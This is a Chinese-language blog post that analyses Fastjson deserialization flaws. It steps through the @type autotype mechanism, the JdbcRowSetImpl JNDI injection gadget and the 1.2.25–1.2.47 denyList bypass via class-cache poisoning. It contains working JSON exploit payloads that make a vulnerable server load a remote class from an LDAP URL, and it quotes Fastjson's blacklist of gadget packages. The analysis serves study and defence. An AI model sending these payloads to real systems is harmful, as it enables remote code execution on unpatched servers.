---
title: Fastjson漏洞分析
date: 2023-04-08 15:19:37
tags: Java
cover: https://raw.githubusercontent.com/todis21/image/main/202304092013733.png
---

# Fastjson漏洞分析

`FastJson` 是阿⾥巴巴的开源 `JSON 解析库`，它可以解析 JSON 格式的字符串，⽀持将` Java Bean` 序列

化为 `JSON` 字符串，也可以从JSON字符串反序列化到 Java Bean



环境：

jdk1.8.0_u111

fastjson: 1.2.24

```xml
<dependency>
  <groupId>com.alibaba</groupId>
  <artifactId>fastjson</artifactId>
  <version>1.2.24</version>
</dependency>
```

## Fastjson的简单使用

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import jdk.nashorn.api.scripting.JSObject;

public class demo1 {
    public static void main(String[] args) {
        String s = "{\"age\":\"18\",\"name\":\"abc\"}";
        JSONObject jsonObject = JSON.parseObject(s);//将字符串解析为json格式
        System.out.println(jsonObject);

    }
}
```

输出结果：

```tex
{"name":"abc","age":"18"}
```





##  Java Bean

Java Bean 是一种符合特定规范的 Java 类，它是指那些用于传递数据的简单对象。Java Bean 类通常具有以下特点：

1. 必须有一个默认的构造函数；
2. 属性必须私有化`public`，通过公有的`public`   getter/setter 方法进行访问；

```java
public class Person {
    private String name;
    private int age;

    public String getName() { return this.name; }
    public void setName(String name) { this.name = name; }

    public int getAge() { return this.age; }
    public void setAge(int age) { this.age = age; }
}
```

Java Bean 主要用于封装数据，方便在不同层间传递。它们通常被广泛用于图形用户界面 (GUI) 编程、企业级应用程序和数据库操作等方面，可以使代码更加清晰易懂，并且提高代码的可复用性和扩展性。



## Fastjson+Java Bean

先写一个`Java Bean`  Person类

```java
package org.example;

public class Person {
    private String name;
    private int age;
    public void Person() {
        System.out.println("调用空参构造Person()");
    }
    public void Person(String name, int age) {
        System.out.println("调用形参构造Person(String name, int age)");
        this.name = name;
        this.age = age;
    }
    public String getName() {
        System.out.println("调用getName()");
        return name;
    }
    public void setName(String name) {
        System.out.println("调用setName()");
        this.name = name;
    }
    public int getAge() {
        System.out.println("调用getAge()");
        return age;
    }
    public void setAge(int age) {
        System.out.println("调用setAge()");
        this.age = age;
    }
    @Override
    public String toString() {
        System.out.println("调用toString()");
        return "User{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}
```



写个demo

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import jdk.nashorn.api.scripting.JSObject;

public class demo1 {
    public static void main(String[] args) {
        String s = "{\"age\":\"18\",\"name\":\"abc\"}";
        Person p =  JSON.parseObject(s,Person.class);//解析的时候指定解析的类,指定了对象类型
        System.out.println(p);
        System.out.println(p.getName());
        System.out.println(p.getAge());
        System.out.println(p.toString());

    }
}
```

输出结果

```tex
调用setAge()
调用setName()
调用toString()
User{name='abc', age=18}
调用getName()
abc
调用getAge()
18
调用toString()
User{name='abc', age=18}
```

这里可以看到，把json字符串解析为java对象，并且能够正常调用对象的方法

通过输出结果和调试了解到，json中对应的值是通过setter方法传给对象的 ，并且通过getter获取值



## 奇怪的特性

上面的都是比较正常的用法,但是Fastjson有个奇怪的特性，就是它会根据传入的字符串不同，导致解析不同的类

例如：

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import jdk.nashorn.api.scripting.JSObject;

public class demo1 {
    public static void main(String[] args) {
        String s = "{\"@type\":\"org.example.Person\",\"age\":\"18\",\"name\":\"abc\"}";
        JSONObject jsonObject = JSON.parseObject(s);
        System.out.println(jsonObject);
        System.out.println(jsonObject.get("age"));

    }
}
```

输出结果

```
调用setAge()
调用setName()
调用getAge()
调用getName()
{"name":"abc","age":18}
18
```

如果给解析传的字符串中含有`@type`字段，就相当于指定一个类(如例子中的`org.example.Person`)，按照这个类去解析





调试分析：

调试到DefaultJSONParser.java，这里有一个判断，当json中key为“@type”并且满足`!lexer.isEnabled(Feature.DisableSpecialKeyDetect)`

就会进入判断

![image-20230408222122119](https://raw.githubusercontent.com/todis21/image/main/202304092009321.png)



进入判断后，调用`TypeUtils.loadClass()`,将@type对应的value作为类对象加载





## 反序列化利用链

fastjson的反序列化和原生反序列化不同的点：

* 不需要实现Serializable
* 变量不需要非transient ,变量有对应的setter或者是public 或者是满足条件的getter
* 原生的反序列化的入口点是readObject,但fastjson是setter/getter

总的来说，和原生的反序列化漏洞不是一个东西，协议不同，fastjson在解析json数据的过程中进行的序列化操作，并且和原生的序列化操作不一样





这个序列化的漏洞点在`JdbcRowSetImpl`类中，

里面的connect方法如下

```java
private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```

在第6,7行中可以看到它调用了 `InitialContext()`和 `lookup()` ，如果`this.getDataSourceName()`可控，这不妥妥的JNDI注入吗

查看一下`getDataSourceName()`，发现是直接返回`dataSource`

```java
public String getDataSourceName() {
    return dataSource;
}
```

`dataSource`,跟进查看得知，它是BaseRowSet类的一个私有属性，并且存在getter和setter方法

```java

public String getDataSourceName() {
    return dataSource;
}
```

```java
public void setDataSourceName(String name) throws SQLException {

    if (name == null) {
        dataSource = null;
    } else if (name.equals("")) {
       throw new SQLException("DataSource name cannot be empty string");
    } else {
       dataSource = name;
    }

    URL = null;
}
```

这就很符合Java Bean的写法



到这里，我们是可以构造这样的POC

`ldap://127.0.0.1:8085/VigsjhwY`,弹计算器的恶意类

```java
String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/VigsjhwY\"}";
JSON.parseObject(s);
```

但是这运行没法达到我们想要的结果



遇事不决，查找用法

这里查找connect()的用法，在`JdbcRowSetImpl`类中`setAutoCommit()`，找到了`connect()`，

```java
public void setAutoCommit(boolean var1) throws SQLException {
    if (this.conn != null) {
        this.conn.setAutoCommit(var1);
    } else {
        this.conn = this.connect();
        this.conn.setAutoCommit(var1);
    }

}
public boolean getAutoCommit() throws SQLException {
    return this.conn.getAutoCommit();
}
```

为了能够进入这个方法，还需要加上`AutoCommit`,解析的时候才会调用setter

因为它的参数是`boolean`类型的，传入个true或false,也可以传入0或1

最终POC

```java
public class demo1 {
    public static void main(String[] args) {
        String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/VigsjhwY\",\"autoCommit\":true}";
        JSON.parseObject(s);
        //JSON.parse(s)//使用这个也行
    }
}
```

![image-20230409200759348](https://raw.githubusercontent.com/todis21/image/main/202304092011433.png)

![image-20230409200831610](https://raw.githubusercontent.com/todis21/image/main/202304092011828.png)



## fastjson1.2.25<=1.2.47绕过

刚刚复现的版本是1.2.24的fastjson,在这个版本之前，fastjson没有做类加载的限制，导致任意代码执行的问题

在1.2.24之后对漏洞进行了修复

下面用的是1.2.25版本进行演示

```xml
<dependency>
  <groupId>com.alibaba</groupId>
  <artifactId>fastjson</artifactId>
  <version>1.2.25</version>
</dependency>
```

再运行上次的payload直接报错

![image-20230410140121948](https://raw.githubusercontent.com/todis21/image/main/202304101836889.png)



经过调试发现，在DefaultJSONParser.java中，loadClass变成了`checkAutoType`

![image-20230410141141798](https://raw.githubusercontent.com/todis21/image/main/202304101836261.png)

和之前的对比：

![image-20230408222122119](https://raw.githubusercontent.com/todis21/image/main/202304092009321.png)



应该是这里出了问题，跟进去看看

发现之前的`TypeUtils.loadClass()`被丢到了判断里面了，并且按照之前的poc无法进入到判断里面

![image-20230410142236791](https://raw.githubusercontent.com/todis21/image/main/202304101836949.png)



进入判断后还有两个循环，一个白名单`acceptList`,这个默认是空的，另一个是黑名单，`denyList`，这个是有内容的，内容如下：

```java
denyList        = "bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework".split(",");
```

 

可以看到`com.sun`在黑名单里面

这里的`TypeUtils.loadClass()`是用不了了，因为加载的类不在白名单里，换下一个

调试往下

![image-20230410155047075](https://raw.githubusercontent.com/todis21/image/main/202304101836822.png)



`getClassFromMapping(typeName)`是查找缓存，就是加载过的类会放到Mapping里，就是缓存，到第二次加载的时候就不重新加载了，直接在缓存里找



如果loadClass的时候就把恶意类放到缓存里了，是不是就可以绕过check了



跟进去看看

```java
public static Class<?> getClassFromMapping(String className) {
    return mappings.get(className);
}
```

这里直接从mappings里面获取数据



现在的问题是如何在mappings里面存东西

ALT+F7,查找用法，在loadClass(String,ClassLoader)里找到可以控制参数的`mappings.put`

![image-20230410161554305](https://raw.githubusercontent.com/todis21/image/main/202304101835506.png)



看看loadClass()

```java
public static Class<?> loadClass(String className, ClassLoader classLoader)
{
.....
}
```



继续查找`loadClass`方法的调用

![image-20230410173820101](https://raw.githubusercontent.com/todis21/image/main/202304101835230.png)

![image-20230410174149665](https://raw.githubusercontent.com/todis21/image/main/202304101835994.png)

有限制条件，只有满足`clazz == Class.class`才能进入,其中clazz是传进来的参数

```java
public <T> T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName){}
```

看一下所在的类

```java
public class MiscCodec implements ObjectSerializer, ObjectDeserializer{}
```

在这可以知道`MiscCodec`实现了两个接口，是一个序列化和反序列化器

经过调试过程中发现，反序列化是在这里获取的

![image-20230410175101694](https://raw.githubusercontent.com/todis21/image/main/202304101835023.png)

通过config找到对应的反序列化器，当类为`Class.class`的时候就会调用`MiscCodec`

![image-20230410175526180](https://raw.githubusercontent.com/todis21/image/main/202304101835579.png)

回到这里

```java
if (clazz == Class.class) {
    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
}
```

`strVal`是传进来的字符串，当loadClass执行后，会把类名加载，然后放到缓存里



整个流程中，最主要的漏洞在于，当查找缓存的时候，查找到了就会返回这个类

![image-20230410181347378](https://raw.githubusercontent.com/todis21/image/main/202304101835253.png)



第一步先让它进行正常的加载，把恶意类放到缓存里

```java
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
```

第二不就是加载恶意类，通过从缓存里查找来绕过类型检查java

```java
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8085/XzfLalyY","autoCommit":true}
```

最后的POC

```java
package org.example;
import com.alibaba.fastjson.JSON;
public class demo1 {
    public static void main(String[] args) {
        String s = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/XzfLalyY\",\"autoCommit\":true}}";
        JSON.parse(s);
    }
}
```

![image-20230410182733010](https://raw.githubusercontent.com/todis21/image/main/202304101835796.png)
